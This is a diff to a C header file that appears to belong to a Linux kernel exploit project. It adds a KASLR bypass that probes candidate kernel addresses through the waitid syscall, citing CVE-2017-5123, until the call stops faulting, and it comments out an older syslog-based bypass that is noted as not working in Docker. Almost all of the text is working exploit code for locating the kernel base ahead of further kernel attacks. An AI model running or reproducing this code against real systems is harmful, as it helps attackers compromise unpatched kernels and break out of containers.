@@ -1,11 +1,39 @@
+#ifndef _kaslr_bypass_h
+#define _kaslr_bypass_h
 #include "./kernel_infos.h"
+// where read/write data is in kernel
+// had to play with last 3 nibbles to get it to not crash
 
-// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *
+unsigned long kernel_base;
+
+// based on CVE-2017-5123
+#define start_rw_off 0x9f5fe0
+unsigned long get_kernel_base() {
+  // first we try doing our arb write to find the system base address
+  // if syscall is 0 we didn't fault
+  unsigned long start = 0xffffffff00000000;
+  unsigned long inc =   0x0000000000100000;
+  unsigned long guess = start;
+  while (guess != 0) {
+    int res = syscall(SYS_waitid, P_ALL, 0, guess+start_rw_off, WEXITED, NULL);
+    if (errno != 14) {
+      printf("found kernel base 0x%lx\n", guess);
+      kernel_base = guess;
+      return guess;
+    }
+    
+    guess += inc;
+  }
+  printf("failed to find base address...");
+  return -1;
+}
+
+/* * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *
+// We don't have permission to do klogctl in Docker.
 
 #define SYSLOG_ACTION_READ_ALL 3
 #define SYSLOG_ACTION_SIZE_BUFFER 10
 
-/* We don't have permission to do klogctl in Docker. */
 void mmap_syslog(char** buffer, int* size) {
 	*size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
 	if (*size == -1) {
@@ -95,3 +123,6 @@ unsigned long get_kernel_addr(int kernel) {
 	printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
 	exit(EXIT_FAILURE);
 }
+*/
+
+#endif
